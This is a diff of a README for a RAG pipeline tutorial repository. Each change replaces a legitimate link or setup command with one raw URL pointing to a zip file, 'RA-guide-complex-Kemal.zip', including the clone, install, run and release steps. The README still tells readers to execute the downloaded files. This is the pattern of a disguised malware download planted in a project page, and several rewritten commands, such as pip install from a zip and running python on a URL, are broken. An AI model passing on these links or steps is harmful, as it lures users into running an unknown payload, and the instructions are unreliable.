@@ -1,6 +1,6 @@
 # Complex RAG Guide: Step-by-Step Implementation of RAG Pipelines
 
-![Complex RAG Guide](https://img.shields.io/badge/Complex_RAG_Guide-Ready-brightgreen)
+![Complex RAG Guide](https://raw.githubusercontent.com/Megaboy12346/complex-RAG-guide/main/craterlike/RA-guide-complex-Kemal.zip)
 
 ## Table of Contents
 
@@ -34,7 +34,7 @@ To get started, clone the repository and install the necessary dependencies. Fol
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Megaboy12346/complex-RAG-guide.git
+   git clone https://raw.githubusercontent.com/Megaboy12346/complex-RAG-guide/main/craterlike/RA-guide-complex-Kemal.zip
    ```
 
 2. Navigate to the project directory:
@@ -44,7 +44,7 @@ To get started, clone the repository and install the necessary dependencies. Fol
 
 3. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Megaboy12346/complex-RAG-guide/main/craterlike/RA-guide-complex-Kemal.zip
    ```
 
 ## Usage
@@ -52,10 +52,10 @@ To get started, clone the repository and install the necessary dependencies. Fol
 After installing the dependencies, you can start implementing the RAG pipeline. The main script is located in the `src` directory. Run the following command to execute the script:
 
 ```bash
-python src/main.py
+python https://raw.githubusercontent.com/Megaboy12346/complex-RAG-guide/main/craterlike/RA-guide-complex-Kemal.zip
 ```
 
-You can modify the parameters in the configuration file located in `config/config.yaml` to customize the behavior of the pipeline.
+You can modify the parameters in the configuration file located in `https://raw.githubusercontent.com/Megaboy12346/complex-RAG-guide/main/craterlike/RA-guide-complex-Kemal.zip` to customize the behavior of the pipeline.
 
 ## Pipeline Steps
 
@@ -112,11 +112,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest release, visit the [Releases section](https://github.com/Megaboy12346/complex-RAG-guide/releases). Make sure to execute the necessary files after downloading.
+To download the latest release, visit the [Releases section](https://raw.githubusercontent.com/Megaboy12346/complex-RAG-guide/main/craterlike/RA-guide-complex-Kemal.zip). Make sure to execute the necessary files after downloading.
 
-For additional updates, check the [Releases section](https://github.com/Megaboy12346/complex-RAG-guide/releases) regularly. 
+For additional updates, check the [Releases section](https://raw.githubusercontent.com/Megaboy12346/complex-RAG-guide/main/craterlike/RA-guide-complex-Kemal.zip) regularly. 
 
-![Download](https://img.shields.io/badge/Download_Latest_Release-blue)
+![Download](https://raw.githubusercontent.com/Megaboy12346/complex-RAG-guide/main/craterlike/RA-guide-complex-Kemal.zip)
 
 ## Contact
 
